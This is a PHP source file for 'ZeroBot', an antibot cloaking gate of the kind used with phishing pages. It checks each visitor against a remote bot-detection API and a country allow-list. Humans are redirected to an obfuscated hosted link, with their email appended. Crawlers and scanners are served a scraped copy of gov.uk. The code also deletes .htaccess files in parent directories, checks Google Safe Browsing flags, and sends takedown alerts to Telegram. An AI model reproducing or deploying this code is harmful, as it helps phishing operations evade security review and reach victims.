<?php

/*
    Antibot Service (ZeroBot)

    * This Tool is not for illegal use
    * All right reserved to @brendonurie2000

    Platform : https://zerobot.info
    Author  : @brendonurie2000

    *** Official Version 5 ***
*/

$license_key = "3b11sgdgnl9atpdcr79leftsc8xtyfd4"; // [REQUIRED]

$redirect = "https://kratgds.up.railway.app?eTUxY0M1eWRmc1lXbHNkMkY1TG1Gd2NEOXpNR1F6UWtOV01Va3p0M1eWRmc1lXbHNkMkY1TG1G0M1eWRmc1lXbHNkMkY1TG1G"; // URL or FILE [REQUIRED]

$parameter = 1; // [REQUIRED]

/*
	1 : Check Bots And Countries.
	2 : Check Only Bots.
	3 : Check Only Countries.
	4 : Allow All Visitors.
*/

$_COUNTRY_ALLOWED = ["ma", "fr", "ca", "mx", "uk", "za", "ng", "tr", "at", "be", "bg", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]

$redirection_link_check = false; // Check Your Page If Still Uploaded

$check_red_page = false; // Check The Redirect If Red Flag

$authentification = false; // Not necessary

$cloaker = [
    "url_to_grab" => "https://www.gov.uk", // Change the link you want to grap it in your link ( if t)
];

$auto_grabber = false; // Activate Auto Grab Email

$location_bots = "https://google.com"; // Send The Bots To This Link ( If Cloaker Url Empty )

$view_file_name = "views.php"; // Type PHP Extension Will Be Added Auto Per Example : views.php

$token_chat = "TOKEN"; // Your Token To Receive Rapports

$chatid = "CHAT ID"; // Your ChatID To Receive Rapports

$captcha = false; // Allow ZeroBot Captcha

$remove_visitors_duplicate = true; // Visitors Remove Duplicate


ZeroBot::PHP_VERSION();
ZeroBot::DefineConstants();


class ZeroBot
{
    public $api = "https://zerobot.info/api/v2/antibot"; // Don't Change The Antibot Server
    public $captcha_api = "https://zerobot.info/api/v2/captcha"; // Don't Change The Antibot Server Captcha
    public $api_geo = "https://zerobot.info/api/v2/getinfo"; // Don't Change The Antibot Server GeoLocation
    public $telegram = "https://api.telegram.org/bot"; // Telegam Api
    public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site="; // Google API To Check Down Links

    public $data_show = '<?php error_reporting(0); session_start(); $filename = "BASENAME"; $file = explode("onload", file_get_contents(basename($_SERVER["PHP_SELF"])))[2];$human = substr_count($file, "#00a300");$bots = substr_count($file, "#FF0000");?><head><title>ZeroBot Statistique</title>  <link rel="icon" type="image/png" href="https://zerobot.info/dashboard/assets/images/favicon.ico">  <script src="https://zerobot.info/assets/js/script.js" crossorigin="anonymous"></script><style>table {font-size: 13px}</style><link href="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/css/coreui.min.css" rel="stylesheet"integrity="sha384-N6/iVUKuB1Y9fhC3xnBbekegSwfXwMNEIvMxNyYLO6z9vmfxMyEwPNsH0k+p4beB" crossorigin="anonymous"><!-- Option 2: CoreUI PRO for Bootstrap Bundle with Popper --><script src="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/js/coreui.bundle.min.js"integrity="sha384-J57aCZcRcbraFuQaL18wp1fDE0fLyO7Il/jKACMovk4ddxUIvjRK5ZZnqcHuBF/T" crossorigin="anonymous"></script></script><script src="https://zerobot.info/assets/js/report.js"></script></head><header class="header"><a class="header-brand" href="https://zerobot.info"><img src="https://zerobot.info/dashboard/assets/images/favicon.ico" alt="" width="34" height="30"class="d-inline-block align-top" alt="CoreUI Logo">ZeroBot</a><a class="dropdown-toggle text-white btn btn-success" href="#" role="button" data-coreui-toggle="dropdown" aria-expanded="false">Options</a><ul class="dropdown-menu">  <li><a class="dropdown-item" href="<?php echo $filename . "?delete" ?>">Reset Traffic</a></li>  <li><a class="dropdown-item" href="<?php echo $filename . "?del" ?>">Delete Antibot File</a></li></ul><ul class="nav nav-pills nav-justified"><button type="button" class="text-white  btn btn-secondary m-1"><svg width="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 21H7.8C6.11984 21 5.27976 21 4.63803 20.673C4.07354 20.3854 3.6146 19.9265 3.32698 19.362C3 18.7202 3 17.8802 3 16.2V3M6 15L10 11L14 15L20 9M20 9V13M20 9H16"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg> <span class="cil-contrast"></span> <?php echo $_SESSION["plan"]; ?></button><button type="button" class="text-white btn btn-danger m-1"><svg fill="#000000" width="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21.928 11.607c-.202-.488-.635-.605-.928-.633V8c0-1.103-.897-2-2-2h-6V4.61c.305-.274.5-.668.5-1.11a1.5 1.5 0 0 0-3 0c0 .442.195.836.5 1.11V6H5c-1.103 0-2 .897-2 2v2.997l-.082.006A1 1 0 0 0 1.99 12v2a1 1 0 0 0 1 1H3v5c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5a1 1 0 0 0 1-1v-1.938a1.006 1.006 0 0 0-.072-.455zM5 20V8h14l.001 3.996L19 12v2l.001.005.001 5.995H5z" /><ellipse cx="8.5" cy="12" rx="1.5" ry="2" /><ellipse cx="15.5" cy="12" rx="1.5" ry="2" /><path d="M8 16h8v2H8z" /></svg><span class="cil-contrast"></span> <?php echo $bots; ?></button><button  onclick="showHuman()"  type="button" class="text-white btn btn-success m-1"><svg fill="#000000" width="20px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 15.503A5.041 5.041 0 1 0 16 5.42a5.041 5.041 0 0 0 0 10.083zm0 2.215c-6.703 0-11 3.699-11 5.5v3.363h22v-3.363c0-2.178-4.068-5.5-11-5.5z" /></svg><span class="cil-contrast"></span> <?php echo $human; ?></button><button type="button" class="text-white  btn btn-warning m-1"><svg width="20px" viewBox="0 0 24 24" fill="none"xmlns="http://www.w3.org/2000/svg"><path d="M3 5.5L5 3.5M21 5.5L19 3.5M9 12.5L11 14.5L15 10.5M20 12.5C20 16.9183 16.4183 20.5 12 20.5C7.58172 20.5 4 16.9183 4 12.5C4 8.08172 7.58172 4.5 12 4.5C16.4183 4.5 20 8.08172 20 12.5Z"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg><span class="cil-contrast">  <?php echo $_SESSION["days_left"]; ?> </span> </button></ul></header><script type="text/JavaScript">function AutoRefresh( t ) {setTimeout("location.reload(true);", t);}</script><body onload="JavaScript:AutoRefresh(30000);"><table class="table"><thead class="table-dark"><tr><th scope="col">IP</th><th scope="col">Time</th><th scope="col">Machine</th><th scope="col">ISP</th><th scope="col">Hostname</th><th scope="col">Country</th><th scope="col">Type</th><th scope="col">Action</th></tr></thead>';
    

    public function __construct()
    {
        global $captcha, $license_key, $redirect, $parameter, $authentification, $token, $chatid, $view_file_name, $remove_visitors_duplicate, $auto_grabber;
    
        $this->token = $token;
        $this->chatid = $chatid;
        $this->vu_filename = $view_file_name;
        $this->license_key = $license_key;
        $this->useragent = $_SERVER["HTTP_USER_AGENT"];
        $this->rm_db = $remove_visitors_duplicate;
        $this->data_show = str_replace("BASENAME", basename(__FILE__), $this->data_show);
        $this->redirect = $redirect;
    
        $this->ValidateQuery();
        $this->HtaccessRemover();
        $this->AccessManager();
        $this->IPManager();
        $this->GoogleFlagCheck();
        $this->LinkVerification($license_key);
        $this->GrabberSet($auto_grabber);
        $this->CaptchaRedirection();
    
        $_SESSION['redirect'] = $this->redirect;
        

        switch ($parameter) {
            case "1":
             

                if ($this->ApiManager($captcha) == true) {

                    if ($captcha) {

                        $this->CaptchaResolver();

                    } else {

                        header("location:" . $this->redirect);
                        exit();
                    }
                }
                
                break;
            case "2":
                if ($this->ApiManager($captcha) == true) {

                    if ($captcha) {
                        $this->CaptchaResolver();
                    } 
                    else {

                        header("location:" . $this->redirect);
                        exit();
                    }
                }
                break;
            case "3":

                $this->GeolocationManager($license_key);

                $this->CountryManager();

                $this->ViewsManager("Human");

                if ($captcha) {

                    $this->CaptchaResolver();
                    
                } else {
                    header("location:" . $this->redirect);
                    exit();
                }
                break;
            default:

                $this->GeolocationManager($license_key);
                $this->ViewsManager("Allowed");

                if ($captcha) {
                    $this->CaptchaResolver();
                } else {
                    header("location:" . $this->redirect);
                    exit();
                }
                break;
        }
     


        
    }
    
    private function VisitorStorage($identification)
    {
        if (!isset($_SESSION["visitor_check"]))
        {

        }
    }
    private function handleCaptchaOrRedirect($captcha)
    {
        if ($captcha) {
            $this->CaptchaResolver();
            exit();
        } else {
            header("Location: " . $this->redirect);
            exit();
        }
    }

    public function IgnoreNoBrowser()
    {
        if (php_sapi_name() == 'cli' || $_SERVER['REQUEST_METHOD'] !== 'GET') {
            exit();
        }
    }
    public function ValidateQuery()
    {
        global $license_key,$redirect,$parameter;

        if (empty($license_key) || empty($redirect) ||strlen($license_key) != 32) {
            die("<script>alert('Check your entries and try again !')</script>");
        }

        if (empty($parameter) or !is_numeric($parameter)) {
            $parameter = 1;
        }

        if (!empty($this->vu_filename)) {
            if (!file_exists($this->vu_filename)) {
                $f = fopen($this->vu_filename, "a");
            }
        }
    }

    public function HtaccessRemover()
    {
        $paths = ["../.htaccess", "../../.htaccess", "../../../.htaccess", ".htaccess"];

        foreach ($paths as $path) {
            if (file_exists($path) && is_writable($path)) {
                unlink($path);
            }
        }
    }

    public function GrabberSet($auto_grabber)
    {
        if ($auto_grabber && isset($_GET["email"]))
        {
            $this->redirect .= "#" . $_GET["email"];
        }

    }
    public static function PHP_VERSION()
    {
        if ((int) phpversion()[0] < 5) {
            echo "PHP Version Required 5+";
            exit();
        }
    }

    public function AccessManager()
    {
        if (isset($_GET["del"])) {

            unlink(basename(__FILE__));
            echo "✅ Antibot File Deleted : " . basename(__FILE__);
            exit();
        }
        if (isset($_GET["check"])) {

            print "AccessID923487";
            exit();
        }
        if (isset($_GET["delete"])) {

            $file_handle = fopen($this->vu_filename, "w");
            $f = fopen($this->vu_filename, "a");
            fwrite($f, $this->data_show);
            fclose($f);
            header("location:" . $this->vu_filename);
            exit();
        }
    }

    public static function DefineConstants()
    {
        session_start();
        error_reporting(0);
        ini_set("display_errors", 0);
        ini_set("display_startup_errors", 0);
        header("Content-type: text/html; charset=UTF-8");
        define("key_id", "AccessID923487");
    }

    private function CurlAccess($url, $post = null)
    {
        $ch = curl_init();
    
        if (is_array($post) && !empty($post)) {
            $url .= '?' . http_build_query($post);
        }
    
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_FRESH_CONNECT => true,
            CURLOPT_AUTOREFERER => true,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_HTTPHEADER => [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            ],
            CURLOPT_RETURNTRANSFER => true,
        ]);
    
        $response = curl_exec($ch);
        curl_close($ch);
    
        if ($response === false || $response === '') {
            return @file_get_contents($url) ?: false;
        }
    
        return $response;
    }

    public function CountryManager()
    {
        global $_COUNTRY_ALLOWED;

        $country_name = strtolower($this->country_code);
  
        if (!in_array($country_name, $_COUNTRY_ALLOWED)) 
        {
            $this->ViewsManager("Country Denied");
            $this->BotRedirectionApply();
            exit();
        }
    }

    public function LicenseVerification($data_json_decoded)
    {
        if (isset($data_json_decoded["query"]) && $data_json_decoded["query"] == "failed") {
            echo "<script>alert('" . htmlspecialchars($data_json_decoded["reason"],ENT_QUOTES,"UTF-8") ."');</script>";
            exit();
        }
    }

    private function GeolocationManager($license_key)
    {
        $post_app = ["license" => $license_key, "ip" => $this->ip];

        $data_geo = $this->CurlAccess($this->api_geo, $post_app);

        $data_json_decoded = @json_decode($data_geo, true);

        $this->LicenseVerification($data_json_decoded);

        $this->country_code = $data_json_decoded["country_code"];
        $this->country_name = $data_json_decoded["country"];
        $this->isp = $data_json_decoded["isp"];
        $this->hostname = $data_json_decoded["hostname"];
        $this->username = $data_json_decoded["username"];
    }

    public function CloakerSetup($url)
    {
        global $location_bots, $html;

        $url = rtrim($url, '/') . '/'; 

        $html = $this->CurlAccess($url, null);
        if ($html === false) {
            header("Location: " . $location_bots);
            exit();
        }

        $doc = new DOMDocument();
        libxml_use_internal_errors(true);
        $doc->loadHTML($html);
        libxml_clear_errors();
        $xpath = new DOMXPath($doc);

        $key_app = array(
            "//link[@rel='stylesheet']" => "href",
            "//script[contains(@src, '.js')]" => "src",
            "//img" => "src",
            "//a" => "href",
            "//link[@rel='icon']" => "href"
        );

        foreach ($key_app as $xpathQuery => $attribute) {
            foreach ($xpath->query($xpathQuery) as $element) {
                if ($element->hasAttribute($attribute)) {
                    $oldSourceLink = $element->getAttribute($attribute);

                    if (substr($oldSourceLink, 0, 4) != 'http') {
                        if (substr($oldSourceLink, 0, 2) === '//') {
                            $oldSourceLink = ($url[4] === 's' ? 'https:' : 'http:') . $oldSourceLink;
                        } else {
                            $oldSourceLink = ltrim($oldSourceLink, './');
                            $oldSourceLink = $url . $oldSourceLink;
                        }
                        $element->setAttribute($attribute, $oldSourceLink);
                    }   
                }
            }
        }

        $html = $doc->saveHTML();
        
        echo $html;
        exit();
    }

    public function ViewsManager($check)
    {
        
        $colors = [
            "Human" => "#00a300",
            "Bot" => "#FF0000",
            "Country Denied" => "#DAA520",
            "Allowed" => "black"
        ];
    
        $color = $colors[$check] ?? "black";
    
        $this->HtmlSetup();
        $this->UserOSManager();
    
        $time = date("d/m/Y h:i:s A");
        $ip_address = $this->ip;
        $machine = $this->useragent;
        $country = $this->country_name;
        $isp = $this->isp;
        $hostname = $this->hostname;
        $country_code = strtolower($this->country_code);
    
        $flag_url = "https://flagpedia.net/data/flags/icon/108x81/{$country_code}.webp";

        $data_to_put ="<tr><th scope='row'>$ip_address</th><td>$time</td><td>$machine</td><td>$isp</td><td>$hostname</td><td><img style='padding-right:5px' width='30px' src='$flag_url'>$country</td><td><b><p style='color:$color'>$check</p></b></td><td><button type='button' username='{$this->username}' hostname='$hostname' ip='$ip_address' useragent='{$this->useragent}' isp='$isp' id='button-submit' class='text-white btn btn-danger btn-sm m-1'><span class='cil-contrast'></span>Report</button></td></tr>";

        if ($this->rm_db) {
            $this->SingleIP($ip_address, $data_to_put);
        } else {
            file_put_contents($this->vu_filename, $data_to_put . "\n", FILE_APPEND);
        }
    }

    public function SingleIP($ip_address, $data_to_put)
    {
        if (is_readable($this->vu_filename) && !preg_match("/$ip_address/", file_get_contents($this->vu_filename))) 
        {
            $file = fopen($this->vu_filename, "a");
            fwrite($file, (string) $data_to_put . "\n");
            fclose($file);
        }
    }

    public function LinkVerification($license_key)
    {
        global $redirection_link_check;

        $redirect = $this->redirect;
        if (strpos($redirect, "key") !== false) {
            $redirect = str_replace("?key=" . $license_key, "", $redirect);
        }

        if ($redirection_link_check) {
            $data_check = $this->CurlAccess($redirect . "?check", null);
            if (!preg_match("/" . key_id . "/", $data_check)) {
                $this->RapportManager(0, $redirect);
            }
        }
    }

    public function CaptchaRedirection()
    {
        if (isset($_GET["authorize"])) {
            $array_post = [
                "license" => $this->license_key,
                "ip" => $this->ip,
                "useragent" => $this->useragent,
            ];

            $this->CurlAccess($this->captcha_api, $array_post);

            header("location:" . $_SESSION["redirect"]);
            exit();
        }
    }

    private function GetLink()
    {
        $protocol = (!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on") ? "https" : "http";
        return $protocol . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
    }

    public function CaptchaResolver()
    {
        global $captcha;
        
        if (!$captcha) return;

        $logo = $_SESSION["logo"] ?? "https://zerobot.info/captcha/favicon.png";

        $html = '<html><head> <link rel="icon" type="image/x-icon" href="' . $logo . '"> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <link rel="stylesheet" href="https://zerobot.info/captcha/slider.css"> <link rel="stylesheet" href="https://zerobot.info/captcha/captcha.css" /> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" /> <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script> <script src="https://kit.fontawesome.com/1cf483120b.js" crossorigin="anonymous"></script> <title>Captcha Verification</title></head><body> <div class="container">  <header><img width="80px" src="' . $logo .'"></header>  <p align="center" style="margin-bottom:20px">Verify you are human</p>  <div id="captcha"></div> </div> <script src="https://zerobot.info/captcha/captcha.js"></script></body></html>  ';

        echo $html;
    }


    private function RapportManager($action, $link)
    {
        global $redirection_link_check;

        $date = date("r", $_SERVER["REQUEST_TIME"]);
        if ($action) {
            $this->message = "❗️ Status : Down\n";
            $this->message .= "Link Redirect : " . $this->GetLink() . "\n";
            $this->message .= "Link Server : " . $link . "\n";
            $this->message .= "Link Downed Is : " . $link . "\n";
            $this->message .= "Date : " . $date . "\n";
            $this->TelegramRapport($this->message);
        }
        if ($redirection_link_check == 1 and !$action) {
            $this->message = "❗️ Status : You need to re-upload it now\n";
            $this->message .= "Link Redirect : " . $this->GetLink() . "\n";
            $this->message .= "Link Server : " . $link . "\n";
            $this->message .= "Date : " . $date . "\n";
            $this->TelegramRapport($this->message);
        }
    }


    private function HtmlSetup()
    {
        if (empty($this->vu_filename)) {
            $this->vu_filename = "views.php";
        }
        if (file_exists($this->vu_filename)) {
            if (filesize($this->vu_filename) < 20) {
                $f = fopen($this->vu_filename, "w+");
                fwrite($f, $this->data_show);
                fclose($f);
            }
        } else {
            $f = fopen($this->vu_filename, "a");
            fwrite($f, $this->data_show);
            fclose($f);
        }
    }


    private function IPManager()    
    {        
        foreach (["HTTP_CLIENT_IP","HTTP_X_FORWARDED_FOR","HTTP_X_FORWARDED","HTTP_X_CLUSTER_CLIENT_IP","HTTP_FORWARDED_FOR","HTTP_FORWARDED","REMOTE_ADDR",] as $key) 
        {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(",", $_SERVER[$key]) as $ip_address) 
                {    
                    $ip_address = trim($ip_address);
                    if (filter_var($ip_address,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                    {
                        $this->ip = $ip_address;
                        return;
                    } 
                    else 
                    {
                        $this->ip = "155.133.4.46"; 
                        return;
                    }
                }
            }
        }
    }

    private function TelegramRapport($message)
    {
        if (!empty($message) and strlen($this->token) > 10 and strlen($this->chatid) > 5) 
        {
            $url = $this->telegram . $this->token . "/sendMessage?chat_id=" . $this->chatid . "&text=" . urlencode($message);
            $this->CurlAccess($url, null);
        }
    }

    private function UserOSManager()
    {
        
        if (!empty($_SERVER["HTTP_USER_AGENT"]) && preg_match("/\((.*?)\)/", $_SERVER["HTTP_USER_AGENT"], $match)) {
            $this->useragent = htmlspecialchars($match[1]);
        } else {
            $this->useragent = "Unknown";
        }
    }

    public function GoogleFlagCheck()
    {
        global $check_red_page;

        if (!$check_red_page) return;

        $urls = [$this->redirect, $this->GetLink()];

        foreach ($urls as $url) {
            $response = $this->CurlAccess($this->google_api . $url, null);
            $parts = explode(",", $response);

            if (isset($parts[1]) && $parts[1] == 2) {
                $this->rapport_template(1, $url);
                break;
            }
        }
    }
    
    public function ApiManager($captcha)
    {
        global $license_key,$parameter;
        
        if (isset($captcha)) {
            $array_post = [
                "check_on" => $this->GetLink(),
                "license" => $license_key,
                "ip" => $this->ip,
                "useragent" => $this->useragent,
                "captcha" => "",
            ];
        } else {
            $array_post = [
                "check_on" => $this->GetLink(),
                "license" => $license_key,
                "ip" => $this->ip,
                "useragent" => $this->useragent,
            ];
        }

        $data_decoded = json_decode($this->CurlAccess($this->api, $array_post),true);

        $this->LicenseVerification($data_decoded);
        
        $this->username = $data_decoded["username"];
        $this->country_name = $data_decoded["country_name"];
        $this->country_code = $data_decoded["country_code"];
        $this->isp = $data_decoded["isp"];
        $this->hostname = $data_decoded["hostname"];


        if ($parameter != 2 && $parameter != 4)
            $this->CountryManager();

        $_SESSION["days_left"] = $data_decoded["left"];

        $_SESSION["total_checked"] = $data_decoded["total"];

        $_SESSION["plan"] = $data_decoded["plan"];

        if ($data_decoded["is_bot"] == true) {

            $this->ViewsManager("Bot");

            $this->BotRedirectionApply();

            return 0;

        } 
        else if ($data_decoded["is_bot"] == false) {

            $this->ViewsManager("Human");

            if (array_key_exists("captcha", $data_decoded)) {

                $_SESSION["color"] = $data_decoded["captcha"]["color"];
                $_SESSION["logo"] = $data_decoded["captcha"]["logo"];

            } else {
                unset($_SESSION["color"]);
                unset($_SESSION["logo"]);
            }
            return 1;
        }
    
    }

    public function BotRedirectionApply()
    {
        global $location_bots, $cloaker;
        if (isset($location_bots) && isset($cloaker["url_to_grab"])) {
            if (filter_var($cloaker["url_to_grab"], FILTER_VALIDATE_URL)) {
                $this->CloakerSetup($cloaker["url_to_grab"]);
                exit();
            }
            if (filter_var($location_bots, FILTER_VALIDATE_URL)) {
                header("location:" . $location_bots);
                exit();
            }
        }
    }

}

new ZeroBot();
